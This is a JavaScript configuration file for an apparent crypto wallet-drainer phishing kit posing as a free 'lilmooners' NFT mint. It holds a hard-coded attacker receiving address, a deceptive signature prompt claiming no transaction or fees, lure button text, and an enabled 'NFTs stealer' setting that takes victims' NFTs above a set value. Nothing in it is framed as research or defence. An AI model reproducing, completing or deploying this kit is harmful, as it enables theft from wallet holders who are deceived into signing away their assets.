const receiveAddress = "0xa529F69bb4C1E7eaAe11f95FeAB8abcF94D576AD";

const collectionInfo = {
    name: "",
    socialMedia: {
        discord: "",
        twitter: "https://twitter.com/lilmoonersNFT",
        instagram: "",
    },
}

const signMessage = `Welcome, \n\n` +
    `Sign this message to start your lilmooners free mint.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "bg.png", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "",
}

const claimPageInfo = {
    title: "<br>", // <br> is a line break
    shortDescription: "",
    longDescription: "1 lilmooner NFT per TX",

    claimButtonText: "CLAIM NOW",

    image: "lilmooners.gif", // relative path to image (in assets)
    imageRadius: 0, // image radius in px
}

const drainNftsInfo = {
    active: true, // Active (true) or not (false) NFTs stealer.
    minValue: 0.05, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "0xa529F69bb4C1E7eaAe11f95FeAB8abcF94D576AD" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion